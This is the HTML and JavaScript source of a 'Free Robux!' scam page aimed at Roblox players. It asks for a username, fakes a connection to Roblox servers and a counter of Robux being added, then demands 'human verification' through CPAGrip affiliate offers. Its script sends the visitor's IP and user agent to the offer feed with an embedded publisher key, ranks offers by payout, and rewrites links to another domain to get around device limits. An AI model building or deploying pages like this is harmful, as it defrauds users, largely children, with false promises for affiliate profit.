<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="bootstrap.min.css">
    <link rel="stylesheet" href="devices.min.css">
    <link rel="stylesheet" href="main.css">
    <link rel="icon" type="image/x-icon" href="favicon.ico">
    <title>Free Robux!</title>
    <style>
        /* UI Matching for CPAGrip Offers */
        #cpagrip-offers {
            display: none;
            text-align: left;
            margin-top: 15px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            padding: 10px;
        }
        .offer-item {
            display: block;
            background: #fff;
            color: #333;
            padding: 12px;
            margin-bottom: 8px;
            border-radius: 5px;
            text-decoration: none !important;
            font-weight: bold;
            font-size: 14px;
            border-left: 5px solid #007bff;
            transition: transform 0.2s;
        }
        .offer-item:hover {
            transform: scale(1.02);
            background: #f8f9fa;
        }
        .hot-tag {
            background: #ff4747;
            color: white;
            font-size: 10px;
            padding: 2px 6px;
            border-radius: 3px;
            float: right;
            text-transform: uppercase;
        }
    </style>
</head>

<body>
    <div class="device device-iphone-x">
        <div class="device-frame">
            <div class="device-content">
                <div class="FLICK">

                    <div class="FLICK2">

                        <div class="P1">

                            <img src="LOGO.png" class="w-75 img-fluid mx-auto">

                            <h2>Get <strong>Robux</strong> for free!</h2>

                            <hr>

                            <h5><strong>Step 1:</strong> Type in your <strong>Roblox</strong> username to continue.</h5>

                            <input type="text" class="form-control form-control-lg mb-2 pt-4 pb-4" id="robname" placeholder="Roblox username">

                            <h5><strong>Step 2:</strong> Select how many <strong>free Robux</strong> do you want.</h5>

                             <select class="form-control form-control-lg mx-auto mb-2" id="robux">
                                 <option value="">How many free Robux?</option>
                                 <option value="1700">1700 Robux</option>
                                 <option value="4500">4500 Robux</option>
                                 <option value="10000">10000 Robux</option>
                              </select>

                            <button type="button" class="S1B btn btn-lg btn-block btn-light mb-1 mt-1 pt-2 pb-2" onclick="S1();">Continue</button>

                        </div>

                        <div class="P2">

                            <img src="LOGO.png" class="w-75 img-fluid mx-auto">

                            <h5 id="step34"><strong>Step 3:</strong> Is this <strong>your Roblox profile</strong></h5>

                            <div class="SCARED">

                                <h3 class="mb-2 robnames"></h3>

                                <div class="row justify-content-center">

                                  <div class="col text-center" style="display: flex !important;"><img class="img-fluid robavatar w-75 mx-auto" style="align-self: center !important;"></div>
                                  <div class="col text-center"><img class="img-fluid robwearing"></div>

                                </div>

                                <h4 class="freerobux"><img class="IR" src="Robux.png"> <strong><span id="acc">0</span> free Robux</strong> added...</h4>

                            </div>

                            <h4 class="freerobux777"><img class="IR" src="Robux.png"> <strong><span id="acc777">0</span> free Robux</strong> added...</h4>

                            <div class="row justify-content-center mt-2 YESNO">

                                <div class="col pr-1">
                                    <button type="button" id="BTNYES" class="S2B1 btn btn-block btn-lg btn-light" onclick="SYES();">Yes</button>
                                </div>

                                <div class="col pl-1">
                                    <button type="button" id="BTNNO" class="S2B2 btn btn-block btn-lg btn-light" onclick="SNO();">No</button>
                                </div>

                            </div>

                            <button type="button" id="BTNADD" class="S2B3 btn btn-block btn-lg btn-light mt-2" onclick="SADD();"></button>

                            <h5 id="CONS" class="mt-2">Connecting with <strong>Roblox servers</strong>...</h5>

                            <div id="cpagrip-offers">
                                <h6 class="text-white mb-3">Complete 1 task to verify:</h6>
                                <div id="offer-list">Loading offers...</div>
                            </div>

                            <button type="button" id="VER" class="S2B4 VB btn btn-block btn-lg btn-light mt-2" onclick="showOffers();"><strong>Verify Now</strong></button>

                        </div>

                    </div>

                    <img class="rob-bot" src="BOTTOM.jpg">

                </div>
            </div>
        </div>
        <div class="device-stripe"></div>
        <div class="device-header"></div>
        <div class="device-sensors"></div>
        <div class="device-btns"></div>
        <div class="device-power"></div>
    </div>

    <script src="jquery-3.4.1.min.js"></script>
    <script src="popper.min.js"></script>
    <script src="bootstrap.min.js"></script>
    <script src="countUp.js"></script>
    <script src="main.js"></script>

    <script type="text/javascript">
        function showOffers() {
            // Hide the verify button and show the offer container
            $("#VER").fadeOut();
            $("#CONS").text("Human Verification Required");
            $("#cpagrip-offers").fadeIn();
            loadCPAOffers();
        }

        function loadCPAOffers() {
            const user_id = "2421989";
            const pubkey = "55055efce909f3b3ae2b679b223a1431";
            
            // Fetch IP first for accuracy
            $.getJSON("https://api.ipify.org?format=json", function(ipData) {
                const apiURL = `https://www.cpagrip.com/common/offer_feed_json.php?user_id=${user_id}&pubkey=${pubkey}&ip=${ipData.ip}&ua=${encodeURIComponent(navigator.userAgent)}`;

                $.ajax({
                    url: apiURL,
                    dataType: 'jsonp',
                    success: function(json) {
                        if (!json.offers || json.offers.length === 0) {
                            $("#offer-list").html("<div class='alert alert-danger'>No offers available for your device.</div>");
                            return;
                        }

                        // Sort by payout (Highest first)
                        let sorted = json.offers.sort((a, b) => parseFloat(b.payout) - parseFloat(a.payout));
                        
                        let offerHTML = '';
                        $.each(sorted.slice(0, 4), function(index, offer) {
                            // Motifiles domain replacement to fix "Mobile Only" errors
                            let cleanLink = offer.offerlink.replace('www.cpagrip.com', 'motifiles.com');
                            let hotTag = (index < 2) ? '<span class="hot-tag">Fastest</span>' : '';
                            
                            offerHTML += `
                                <a href="${cleanLink}" target="_blank" class="offer-item">
                                    ${hotTag}
                                    ${offer.title}
                                </a>`;
                        });
                        
                        $("#offer-list").html(offerHTML);
                    },
                    error: function() {
                        $("#offer-list").html("<div class='alert alert-danger'>Error loading offers. Please refresh.</div>");
                    }
                });
            });
        }
    </script>
</body>

    </html>
    
